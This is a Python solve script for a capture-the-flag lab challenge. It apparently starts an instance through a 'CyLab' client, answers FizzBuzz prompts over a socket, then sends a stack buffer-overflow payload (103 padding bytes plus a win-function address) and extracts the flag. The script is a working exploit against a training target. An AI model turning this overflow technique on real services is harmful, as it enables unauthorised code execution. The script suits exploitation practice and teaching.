import socket, struct, sys, time, re, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

WIN = 0x8049206
payload = b"A" * 103 + struct.pack("<I", WIN) + b"\n"


def fizz(n):
    if n % 15 == 0:
        return "FizzBuzz"
    if n % 3 == 0:
        return "Fizz"
    if n % 5 == 0:
        return "Buzz"
    return str(n)


cy = CyLab(delay=1.5)
cy.login()
cy.req("PUT", "/api/challenges/181/instance/?source=library")
HOST = None
for _ in range(12):
    time.sleep(3)
    st, b = cy.req("GET", "/api/challenges/181/instance/")
    d = json.loads(b)
    m = re.search(r"nc`?\s*`?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m and d.get("status") == "RUNNING":
        HOST, PORT = m.group(1), int(m.group(2))
        break
print("HOST", HOST, PORT, flush=True)

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(2)
buf = b""
sent = 0
for step in range(400):
    # lire jusqu'au prochain prompt
    end = time.time() + 2
    while time.time() < end:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    m = re.search(rb"(\d+)\?\s*$", buf)
    if not m:
        tail = buf[-80:]
        print("no numeric prompt at step", step, "tail:", tail, flush=True)
        break
    n = int(m.group(1))
    ans = fizz(n).encode() + b"\n"
    s.sendall(ans)
    buf = b"" if buf.endswith(b"? ") else buf[-200:]
    sent += 1
    buf = b""
print("answered", sent, "prompts", flush=True)

# maintenant on envoie le payload overflow
s.sendall(payload)
time.sleep(1.5)
out = b""
try:
    while True:
        d = s.recv(65536)
        if not d:
            break
        out += d
except socket.timeout:
    pass
print("resp:", out[:300])
m2 = re.search(rb"academy\{[^}]{1,120}\}", out)
print("FLAG:", m2.group(0).decode() if m2 else None)
if m2:
    open(r"./_z_bizz_flag.txt", "w").write(m2.group(0).decode())
s.close()
